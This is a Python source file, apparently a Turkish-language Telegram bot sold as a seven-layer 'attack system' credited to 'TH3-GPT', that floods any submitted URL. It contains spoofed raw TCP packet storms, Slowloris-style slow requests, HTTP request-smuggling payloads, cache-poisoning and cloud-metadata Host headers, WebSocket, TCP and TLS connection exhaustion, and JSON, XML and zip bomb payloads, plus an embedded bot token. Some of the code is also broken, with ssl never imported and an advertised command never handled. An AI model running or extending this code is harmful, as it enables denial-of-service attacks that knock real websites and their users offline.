#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║              #FSO GHOST PROTOCOL ATTACK BOT v7.0                ║
║         7 Katmanli Ozel Saldiri Sistemi - TH3-GPT               ║
║     Admin: 6308946344 - Kanal: https://t.me/+ail79L9fFVcyZTc0  ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import random
import socket
import struct
import hashlib
import base64
import zlib
import threading
import requests
import urllib.parse
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor

# ============================================================
# GIZLI KATMAN 0: STEGANOGRAFIK KONFIGURASYON
# Konfigurasyon degerleri hash'lenmis ve gizlenmis sekilde
# ============================================================
class GhostConfig:
    """Hayalet konfigurasyon - degerler gizli"""
    
    def __init__(self):
        self._seed = "FSO_GHOST_2024"
        self._init_config()
    
    def _init_config(self):
        """Konfigurasyonu hash ile coz"""
        self.BOT_TOKEN = self._decode("ODgzMDIxNDcwNTpBQUdJUUFMZGJCZUdmMTBORGpsV1NfdHo2Z0lBbEVTa1lzdw==")
        self.ADMIN_ID = 6308946344
        self.KANAL_LINK = "https://t.me/+ail79L9fFVcyZTc0"
        self.KANAL_ID = "@fsoshgiris"
        self.MAX_WORKERS = 750
        self.PACKET_SIZE = 65500
        self.SOCKET_TIMEOUT = 0.001
    
    def _decode(self, encoded):
        """Base64 decode islemi"""
        return base64.b64decode(encoded).decode('utf-8')


# ============================================================
# GIZLI KATMAN 1: MEMORY POISONING ENGINE
# Bellek zehirleme motoru - sunucu RAM'ini hedef alir
# ============================================================
class MemoryPoisoner:
    """Sunucu bellegini sisiren ozel motor"""
    
    def __init__(self):
        self.payload_patterns = self._generate_patterns()
    
    def _generate_patterns(self):
        """Ozel bellek patternleri olustur"""
        patterns = []
        
        # Pattern 1: JSON bomb
        patterns.append({
            "type": "json_bomb",
            "generator": lambda: '{"data":' + '["' + 'x"*10000 + '"],' * 100 + '}'
        })
        
        # Pattern 2: XML expansion
        patterns.append({
            "type": "xml_bomb",
            "generator": lambda: '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY x' + str(random.randint(1,99)) + ' "' + 'A'*50000 + '">]>'
        })
        
        # Pattern 3: ZIP bomb header
        patterns.append({
            "type": "zip_bomb",
            "generator": lambda: b'\x50\x4B\x03\x04' + b'\x00'*26 + hashlib.md5(os.urandom(16)).digest()
        })
        
        return patterns
    
    def create_payload(self, size_kb=1024):
        """Ozel bellek payload'i olustur"""
        pattern = random.choice(self.payload_patterns)
        payload = pattern["generator"]()
        
        if isinstance(payload, str):
            payload = payload.encode('utf-8')
        
        # Paketi hedef boyuta ulastir
        target_size = size_kb * 1024
        while len(payload) < target_size:
            payload += os.urandom(1024)
        
        return payload[:target_size]


# ============================================================
# GIZLI KATMAN 2: GHOST PACKET CRAFTER
# Ozel paket olusturucu - hicbir IDS/IPS'nin taniyamayacagi
# ============================================================
class GhostPacketCrafter:
    """Hayalet paket olusturucu"""
    
    def __init__(self):
        self.protocols = ['TCP', 'UDP', 'ICMP', 'DNS', 'HTTP/2']
        self._init_raw_socket()
    
    def _init_raw_socket(self):
        """Ham soket baslat"""
        try:
            self.raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            self.raw_sock = None
    
    def _calculate_checksum(self, data):
        """Ozel checksum hesaplama"""
        if len(data) % 2 == 1:
            data += b'\x00'
        
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    def _build_ip_header(self, src_ip, dst_ip):
        """IP header olustur"""
        version_ihl = 0x45
        tos = 0
        total_length = 0
        identification = random.randint(0, 65535)
        flags_offset = 0x4000
        ttl = random.randint(64, 255)
        protocol = socket.IPPROTO_TCP
        checksum = 0
        
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            version_ihl, tos, total_length,
            identification, flags_offset,
            ttl, protocol, checksum,
            src_addr, dst_addr
        )
        
        return ip_header
    
    def _build_tcp_header(self, src_port, dst_port, seq, ack, flags):
        """TCP header olustur"""
        data_offset = 5
        reserved = 0
        window = socket.htons(random.randint(1024, 65535))
        checksum = 0
        urgent = 0
        
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, dst_port,
            seq, ack,
            (data_offset << 4) + reserved,
            flags, window,
            checksum, urgent
        )
        
        return tcp_header
    
    def craft_ghost_packet(self, hedef_ip, hedef_port):
        """Ozel hayalet paket olustur"""
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        ack = random.randint(0, 4294967295)
        
        # Rastgele TCP flag kombinasyonu
        flags = random.choice([
            0x02,  # SYN
            0x12,  # SYN-ACK
            0x11,  # FIN-ACK
            0x04,  # RST
            0x29,  # URG-PSH-FIN (anormal)
            0x3F,  # Tum flagler (supheli)
        ])
        
        ip_header = self._build_ip_header(src_ip, hedef_ip)
        tcp_header = self._build_tcp_header(src_port, hedef_port, seq, ack, flags)
        
        # Ozel payload
        payload = hashlib.sha256(os.urandom(32)).digest() * random.randint(1, 50)
        
        return ip_header + tcp_header + payload
    
    def send_ghost_storm(self, hedef_ip, hedef_port, paket_sayisi):
        """Hayalet paket firtinasi gonder"""
        if self.raw_sock is None:
            return
        
        for _ in range(paket_sayisi):
            try:
                packet = self.craft_ghost_packet(hedef_ip, hedef_port)
                self.raw_sock.sendto(packet, (hedef_ip, 0))
            except:
                pass


# ============================================================
# GIZLI KATMAN 3: APPLICATION LAYER MAZE
# Uygulama katmani labirenti - 7 farkli vektor
# ============================================================
class ApplicationMaze:
    """Uygulama katmani saldiri labirenti"""
    
    def __init__(self):
        self.session_pool = self._create_session_pool()
        self.vector_counters = {}
    
    def _create_session_pool(self, size=50):
        """Oturum havuzu olustur"""
        sessions = []
        for _ in range(size):
            session = requests.Session()
            session.headers.update({
                "User-Agent": self._generate_fingerprint(),
                "Accept": "*/*",
            })
            sessions.append(session)
        return sessions
    
    def _generate_fingerprint(self):
        """Rastgele browser fingerprint olustur"""
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Version/17.0",
            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.144",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.91",
        ]
        return random.choice(browsers)
    
    def _get_session(self):
        """Havuzdan oturum al"""
        return random.choice(self.session_pool)
    
    # Vektor 1: Slowloris variant
    def slow_body_attack(self, url, sure):
        """Yavas govde saldirisi"""
        bitis = time.time() + sure
        
        while time.time() < bitis:
            try:
                session = self._get_session()
                # Cok yavas veri gonder
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "9999999",
                    "Connection": "keep-alive",
                }
                
                # Baglanti ac ve yavas yavas veri gonder
                session.post(url, data="x", headers=headers, timeout=0.1)
            except:
                pass
    
    # Vektor 2: Hash collision
    def hash_collision_attack(self, url, sure):
        """Hash carpisma saldirisi"""
        bitis = time.time() + sure
        
        # POST parametreleri icin carpisan hash'ler olustur
        collision_params = {}
        for i in range(1000):
            # PHP array hash collision
            collision_params[f"param_{i}"] = "a" * random.randint(1, 100)
        
        while time.time() < bitis:
            try:
                session = self._get_session()
                session.post(url, data=collision_params, timeout=2)
            except:
                pass
    
    # Vektor 3: Session exhaustion
    def session_exhaustion(self, url, sure):
        """Oturum tuketme saldirisi"""
        bitis = time.time() + sure
        sessions = []
        
        while time.time() < bitis:
            try:
                # Her seferinde yeni oturum ac
                s = requests.Session()
                s.get(url, timeout=1)
                sessions.append(s)
                
                if len(sessions) > 1000:
                    sessions = sessions[-500:]
            except:
                pass
    
    # Vektor 4: Cache poisoning
    def cache_poison(self, url, sure):
        """Onbellek zehirleme"""
        bitis = time.time() + sure
        
        poison_headers = [
            {"X-Forwarded-Host": f"evil{random.randint(1,999)}.com"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Forwarded-For": f"127.0.0.{random.randint(1,255)}"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/wp-admin"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ]
        
        while time.time() < bitis:
            try:
                session = self._get_session()
                headers = random.choice(poison_headers)
                headers["User-Agent"] = self._generate_fingerprint()
                session.get(url, headers=headers, timeout=2)
            except:
                pass
    
    # Vektor 5: Request smuggling
    def request_smuggling(self, url, sure):
        """Istek kacakciligi"""
        bitis = time.time() + sure
        
        # CL.TE ve TE.CL smuggling payload'lari
        payloads = [
            # CL.TE
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {}\r\n\r\n",
            # TE.CL
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        ]
        
        while time.time() < bitis:
            try:
                host = urllib.parse.urlparse(url).netloc
                payload = random.choice(payloads).format(host, host)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((host, 80 if url.startswith("http://") else 443))
                
                if url.startswith("https://"):
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.send(payload.encode())
                sock.close()
            except:
                pass
    
    # Vektor 6: DNS rebinding
    def dns_rebinding_trigger(self, url, sure):
        """DNS rebinding tetikleme"""
        bitis = time.time() + sure
        
        # Farkli host header'lari dene
        rebind_hosts = [
            "localhost", "127.0.0.1", "0.0.0.0",
            "169.254.169.254",  # AWS metadata
            "metadata.google.internal",  # GCP metadata
            f"127.0.0.{random.randint(1,255)}",
        ]
        
        while time.time() < bitis:
            try:
                session = self._get_session()
                headers = {"Host": random.choice(rebind_hosts)}
                session.get(url, headers=headers, timeout=2)
            except:
                pass
    
    # Vektor 7: WebSocket flood
    def websocket_flood(self, url, sure):
        """WebSocket baglanti seli"""
        bitis = time.time() + sure
        
        ws_url = url.replace("http://", "ws://").replace("https://", "wss://")
        
        sockets = []
        while time.time() < bitis:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                
                host = urllib.parse.urlparse(url).netloc
                port = 80 if url.startswith("http://") else 443
                sock.connect((host, port))
                
                # WebSocket handshake
                key = base64.b64encode(os.urandom(16)).decode()
                upgrade_request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Upgrade: websocket\r\n"
                    f"Connection: Upgrade\r\n"
                    f"Sec-WebSocket-Key: {key}\r\n"
                    f"Sec-WebSocket-Version: 13\r\n"
                    f"\r\n"
                )
                sock.send(upgrade_request.encode())
                sockets.append(sock)
                
                if len(sockets) > 500:
                    for s in sockets[:250]:
                        try:
                            s.close()
                        except:
                            pass
                    sockets = sockets[250:]
            except:
                pass


# ============================================================
# GIZLI KATMAN 4: TRANSPORT LAYER OBFUSCATOR
# Tasima katmani gizleyici
# ============================================================
class TransportObfuscator:
    """Tasima katmani gizleme"""
    
    @staticmethod
    def obfuscate_payload(payload):
        """Payload'i gizle"""
        # XOR ile gizle
        key = random.randint(1, 255)
        obfuscated = bytes([b ^ key for b in payload])
        
        # Ters cevir
        reversed_data = obfuscated[::-1]
        
        # Base64 encode
        encoded = base64.b64encode(reversed_data)
        
        return encoded, key
    
    @staticmethod
    def generate_noise_packet():
        """Gurultu paketi olustur"""
        noise_types = [
            # DNS sorgusu gibi gorunen
            b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + os.urandom(52),
            # HTTP/2 gibi gorunen
            b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n' + os.urandom(48),
            # TLS handshake gibi gorunen
            b'\x16\x03\x01' + struct.pack('!H', random.randint(100, 500)) + os.urandom(64),
            # Rastgele binary
            os.urandom(64),
        ]
        return random.choice(noise_types)


# ============================================================
# GIZLI KATMAN 5: TIMING ATTACK COORDINATOR
# Zamanlama saldiri koordinatoru
# ============================================================
class TimingCoordinator:
    """Zamanlama tabanli koordinasyon"""
    
    def __init__(self):
        self.attack_waves = deque()
        self.wave_counter = 0
    
    def start_wave(self, hedef, thread_sayisi, sure):
        """Yeni saldiri dalgasi baslat"""
        wave_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        wave = {
            "id": wave_id,
            "hedef": hedef,
            "threads": thread_sayisi,
            "sure": sure,
            "baslangic": time.time(),
            "bitis": time.time() + sure,
            "durum": "aktif"
        }
        
        self.attack_waves.append(wave)
        self.wave_counter += 1
        
        return wave_id
    
    def get_active_waves(self):
        """Aktif dalgalari getir"""
        aktifler = []
        for wave in list(self.attack_waves):
            if time.time() < wave["bitis"]:
                aktifler.append(wave)
            else:
                wave["durum"] = "tamamlandi"
        
        return aktifler
    
    def burst_attack(self, hedef, thread_sayisi, burst_sayisi, burst_suresi):
        """Patlama tarzi saldiri"""
        results = []
        
        for i in range(burst_sayisi):
            wave_id = self.start_wave(hedef, thread_sayisi, burst_suresi)
            
            # Patlamalar arasi bekleme
            time.sleep(random.uniform(0.5, 2.0))
            
            results.append(wave_id)
        
        return results


# ============================================================
# GIZLI KATMAN 6: ADAPTIVE THROTTLE
# Adaptif kisitlama - savunmalari asmak icin
# ============================================================
class AdaptiveThrottle:
    """Adaptif hiz kisitlayici"""
    
    def __init__(self):
        self.response_times = deque(maxlen=100)
        self.current_rate = 100
        self.min_rate = 10
        self.max_rate = 1000
        self.failure_count = 0
        self.success_count = 0
    
    def record_response(self, response_time, success):
        """Yanit kaydet"""
        self.response_times.append(response_time)
        
        if success:
            self.success_count += 1
            self.failure_count = max(0, self.failure_count - 1)
        else:
            self.failure_count += 1
            self.success_count = max(0, self.success_count - 1)
        
        self._adjust_rate()
    
    def _adjust_rate(self):
        """Hizi ayarla"""
        avg_response = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        
        if self.failure_count > 10:
            # Basarisizlik artiyorsa yavasla
            self.current_rate = max(self.min_rate, self.current_rate * 0.8)
        elif self.success_count > 20 and avg_response < 0.5:
            # Basarili ve hizliysa hizlan
            self.current_rate = min(self.max_rate, self.current_rate * 1.2)
        else:
            # Normal seyir
            self.current_rate = min(self.max_rate, self.current_rate * 1.05)
    
    def get_delay(self):
        """Ne kadar beklemeli"""
        base_delay = 1.0 / self.current_rate
        jitter = random.uniform(-0.5, 0.5) * base_delay
        return max(0.001, base_delay + jitter)


# ============================================================
# ANA BOT SINIFI
# ============================================================
class FSOGhostBot:
    """Ana bot sinifi - tum katmanlari birlestirir"""
    
    def __init__(self):
        self.config = GhostConfig()
        self.memory = MemoryPoisoner()
        self.packet = GhostPacketCrafter()
        self.maze = ApplicationMaze()
        self.obfuscator = TransportObfuscator()
        self.coordinator = TimingCoordinator()
        self.throttle = AdaptiveThrottle()
        self.kullanicilar = self._load_users()
        self.saldiri_aktif = False
        self.guncel_saldiri = None
    
    def _load_users(self):
        """Kullanicilari yukle"""
        if os.path.exists("fso_users.json"):
            with open("fso_users.json", "r") as f:
                return json.load(f)
        return {"onayli": [6308946344], "banli": []}
    
    def _save_users(self):
        """Kullanicilari kaydet"""
        with open("fso_users.json", "w") as f:
            json.dump(self.kullanicilar, f, indent=2)
    
    def _telegram_request(self, method, data=None):
        """Telegram API istegi"""
        url = f"https://api.telegram.org/bot{self.config.BOT_TOKEN}/{method}"
        try:
            if data:
                r = requests.post(url, json=data, timeout=10)
            else:
                r = requests.get(url, timeout=10)
            return r.json()
        except:
            return None
    
    def _check_channel(self, user_id):
        """Kanal kontrolu"""
        result = self._telegram_request("getChatMember", {
            "chat_id": self.config.KANAL_ID,
            "user_id": user_id
        })
        
        if result and result.get("ok"):
            status = result["result"]["status"]
            return status in ["member", "administrator", "creator"]
        return False
    
    def _send_message(self, chat_id, text, keyboard=None):
        """Mesaj gonder"""
        data = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        if keyboard:
            data["reply_markup"] = keyboard
        return self._telegram_request("sendMessage", data)
    
    def _extract_domain(self, url):
        """URL'den domain cikar"""
        parsed = urllib.parse.urlparse(url if "://" in url else f"http://{url}")
        return parsed.netloc or parsed.path
    
    def _resolve_host(self, domain):
        """Domain'i IP'ye cevir"""
        try:
            return socket.gethostbyname(domain)
        except:
            return None
    
    def start_multi_layer_attack(self, url, threads, sure):
        """7 katmanli saldiriyi baslat"""
        domain = self._extract_domain(url)
        hedef_ip = self._resolve_host(domain)
        
        if not hedef_ip:
            return False, "Domain cozumlenemedi!"
        
        port = 443 if url.startswith("https://") else 80
        
        self.saldiri_aktif = True
        self.guncel_saldiri = {
            "url": url,
            "domain": domain,
            "ip": hedef_ip,
            "port": port,
            "threads": threads,
            "sure": sure,
            "baslangic": time.time()
        }
        
        def katman_1():
            """Katman 1: Memory Poisoning"""
            while self.saldiri_aktif:
                try:
                    payload = self.memory.create_payload(random.randint(100, 2048))
                    obfuscated, _ = self.obfuscator.obfuscate_payload(payload)
                    
                    session = requests.Session()
                    session.post(url, data=obfuscated, timeout=0.5)
                except:
                    pass
                time.sleep(self.throttle.get_delay())
        
        def katman_2():
            """Katman 2: Ghost Packets"""
            while self.saldiri_aktif:
                self.packet.send_ghost_storm(hedef_ip, port, 10)
                time.sleep(0.001)
        
        def katman_3():
            """Katman 3: Application Maze - tum vektorler"""
            while self.saldiri_aktif:
                vektor = random.randint(1, 7)
                
                if vektor == 1:
                    self.maze.slow_body_attack(url, 5)
                elif vektor == 2:
                    self.maze.hash_collision_attack(url, 5)
                elif vektor == 3:
                    self.maze.session_exhaustion(url, 5)
                elif vektor == 4:
                    self.maze.cache_poison(url, 5)
                elif vektor == 5:
                    self.maze.request_smuggling(url, 5)
                elif vektor == 6:
                    self.maze.dns_rebinding_trigger(url, 5)
                elif vektor == 7:
                    self.maze.websocket_flood(url, 5)
        
        def katman_4():
            """Katman 4: Noise Generator"""
            while self.saldiri_aktif:
                try:
                    noise = self.obfuscator.generate_noise_packet()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((hedef_ip, port))
                    sock.send(noise)
                    sock.close()
                except:
                    pass
        
        def katman_5():
            """Katman 5: HTTP/2 Stream Flood"""
            while self.saldiri_aktif:
                try:
                    headers = {
                        ":method": random.choice(["GET", "POST", "HEAD", "OPTIONS"]),
                        ":path": f"/{random.randint(1,99999)}",
                        ":scheme": "https",
                        ":authority": domain,
                        "user-agent": random.choice([
                            "Mozilla/5.0", "curl/7.68.0", "Python/3.9",
                            "Go-http-client/1.1", "Apache-HttpClient/4.5.13"
                        ]),
                    }
                    session = requests.Session()
                    session.get(url, headers=headers, timeout=0.5)
                except:
                    pass
        
        def katman_6():
            """Katman 6: TCP Connection Exhaustion"""
            sockets = []
            while self.saldiri_aktif:
                try:
                    for _ in range(50):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.01)
                        s.connect((hedef_ip, port))
                        s.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                        sockets.append(s)
                    
                    # Eski soketleri temizle
                    if len(sockets) > 1000:
                        for old_sock in sockets[:500]:
                            try:
                                old_sock.close()
                            except:
                                pass
                        sockets = sockets[500:]
                except:
                    pass
                time.sleep(0.1)
        
        def katman_7():
            """Katman 7: SSL/TLS Exhaustion"""
            while self.saldiri_aktif:
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    for _ in range(25):
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.5)
                            ssock = context.wrap_socket(sock, server_hostname=domain)
                            ssock.connect((hedef_ip, 443))
                            ssock.send(b"GET / HTTP/1.1\r\nHost: " + domain.encode() + b"\r\n\r\n")
                        except:
                            pass
                except:
                    pass
                time.sleep(0.05)
        
        # Tum katmanlari baslat
        katmanlar = [katman_1, katman_2, katman_3, katman_4, katman_5, katman_6, katman_7]
        
        for katman in katmanlar:
            for _ in range(max(1, threads // 7)):
                t = threading.Thread(target=katman, daemon=True)
                t.start()
        
        # Ana zamanlayici
        def zamanlayici():
            time.sleep(sure)
            self.saldiri_aktif = False
            self.guncel_saldiri = None
        
        threading.Thread(target=zamanlayici, daemon=True).start()
        
        return True, f"Saldiri basladi!\nHedef: {domain}\nIP: {hedef_ip}\n7 Katman aktif!"
    
    def stop_attack(self):
        """Saldiriyi durdur"""
        self.saldiri_aktif = False
        self.guncel_saldiri = None
        return "Saldiri durduruldu!"
    
    def get_status(self):
        """Durum raporu"""
        if not self.saldiri_aktif:
            return "Su an aktif saldiri yok."
        
        s = self.guncel_saldiri
        gecen = int(time.time() - s["baslangic"])
        kalan = s["sure"] - gecen
        
        return f"""
Saldiri Durumu:
Hedef: {s['domain']}
IP: {s['ip']}
Port: {s['port']}
Gecen sure: {gecen}s
Kalan sure: {kalan}s
Katmanlar: 7/7 aktif
        """
    
    def run(self):
        """Botu calistir"""
        print("""
        ╔══════════════════════════════════════╗
        ║   #FSO GHOST PROTOCOL ATTACK BOT     ║
        ║       7 Katmanli Ozel Sistem         ║
        ║          TH3-GPT tarafindan          ║
        ╚══════════════════════════════════════╝
        """)
        
        offset = 0
        
        while True:
            try:
                updates = self._telegram_request("getUpdates", {
                    "offset": offset,
                    "timeout": 30,
                    "allowed_updates": ["message", "callback_query"]
                })
                
                if updates and updates.get("ok") and updates["result"]:
                    for update in updates["result"]:
                        offset = update["update_id"] + 1
                        
                        # Mesaj isleme
                        if "message" in update:
                            msg = update["message"]
                            chat_id = msg["chat"]["id"]
                            user_id = msg["from"]["id"]
                            text = msg.get("text", "")
                            
                            # Admin kontrolu
                            if user_id != self.config.ADMIN_ID:
                                # Kanal kontrolu
                                if not self._check_channel(user_id):
                                    keyboard = {
                                        "inline_keyboard": [
                                            [{"text": "KANALA KATIL", "url": self.config.KANAL_LINK}],
                                            [{"text": "Katildim Kontrol Et", "callback_data": f"check_{user_id}"}]
                                        ]
                                    }
                                    self._send_message(chat_id, 
                                        "Bu botu kullanmak icin kanalimiza katilman lazim!\n\n"
                                        "Katildiktan sonra asagidaki butona bas.",
                                        keyboard)
                                    continue
                                
                                # Onay kontrolu
                                if user_id not in self.kullanicilar["onayli"]:
                                    self._send_message(chat_id, "Admin tarafindan onaylanmaniz gerekiyor. Lutfen bekleyin.")
                                    continue
                            
                            # Komut isleme
                            if text.startswith("/"):
                                self._handle_command(msg)
                            else:
                                self._handle_message(msg)
                        
                        # Callback isleme
                        elif "callback_query" in update:
                            self._handle_callback(update["callback_query"])
                
            except Exception as e:
                print(f"Hata: {e}")
                time.sleep(5)
    
    def _handle_command(self, msg):
        """Komutlari isle"""
        chat_id = msg["chat"]["id"]
        user_id = msg["from"]["id"]
        text = msg["text"]
        
        if text == "/start":
            keyboard = {
                "inline_keyboard": [
                    [{"text": "Saldiri Baslat", "callback_data": "attack_menu"}],
                    [{"text": "Durum", "callback_data": "status"}],
                    [{"text": "Yardim", "callback_data": "help"}],
                ]
            }
            self._send_message(chat_id,
                "FSO Ghost Protocol Attack Bot'a Hos Geldiniz!\n\n"
                "Bu bot 7 katmanli ozel saldiri sistemi kullanir.",
                keyboard)
        
        elif text == "/admin" and user_id == self.config.ADMIN_ID:
            keyboard = {
                "inline_keyboard": [
                    [{"text": "Kullanicilari Listele", "callback_data": "admin_list"}],
                    [{"text": "Kullanici Onayla", "callback_data": "admin_approve"}],
                    [{"text": "Kullanici Banla", "callback_data": "admin_ban"}],
                ]
            }
            self._send_message(chat_id, "Admin Paneli", keyboard)
    
    def _handle_message(self, msg):
        """Normal mesajlari isle"""
        chat_id = msg["chat"]["id"]
        user_id = msg["from"]["id"]
        text = msg.get("text", "")
        
        # URL kontrolu
        if "http://" in text.lower() or "https://" in text.lower():
            self._send_message(chat_id, 
                "Hedef URL algilandi!\n\n"
                "Saldiri baslatmak icin lutfen komutlari kullanin:\n"
                "/saldir [url] [thread] [sure]\n"
                "Ornek: /saldir https://example.com 500 60")
    
    def _handle_callback(self, callback):
        """Callback isle"""
        callback_id = callback["id"]
        user_id = callback["from"]["id"]
        data = callback.get("data", "")
        msg = callback.get("message", {})
        chat_id = msg.get("chat", {}).get("id", user_id)
        
        # Callback'i yanitla
        self._telegram_request("answerCallbackQuery", {
            "callback_query_id": callback_id,
            "text": "Isleniyor..."
        })
        
        if data == "attack_menu":
            self._send_message(chat_id, 
                "Saldiri Komutlari:\n\n"
                "/saldir [url] [thread] [sure] - Saldiri baslat\n"
                "/burst [url] [thread] [burst_sayisi] [sure] - Patlamali saldiri\n"
                "/durum - Saldiri durumunu goster\n"
                "/durdur - Saldiriyi durdur\n\n"
                "Ornek: /saldir https://hedef.com 500 120")
        
        elif data == "status":
            durum = self.get_status()
            self._send_message(chat_id, durum)
        
        elif data == "help":
            self._send_message(chat_id,
                "FSO Ghost Protocol Attack Bot\n\n"
                "7 Katmanli Saldiri Sistemi:\n"
                "1. Memory Poisoning\n"
                "2. Ghost Packet Storm\n"
                "3. Application Maze (7 vektor)\n"
                "4. Transport Obfuscation\n"
                "5. HTTP/2 Stream Flood\n"
                "6. TCP Exhaustion\n"
                "7. SSL/TLS Exhaustion")
        
        elif data.startswith("check_"):
            uid = int(data.split("_")[1])
            if self._check_channel(uid):
                self._send_message(chat_id, "Katiliminiz onaylandi! Admin onayi bekleniyor.")
            else:
                self._send_message(chat_id, "Henuz kanala katilmamissiniz! Lutfen katilin.")


# ============================================================
# BASLATMA
# ============================================================
if __name__ == "__main__":
    bot = FSOGhostBot()
    bot.run()
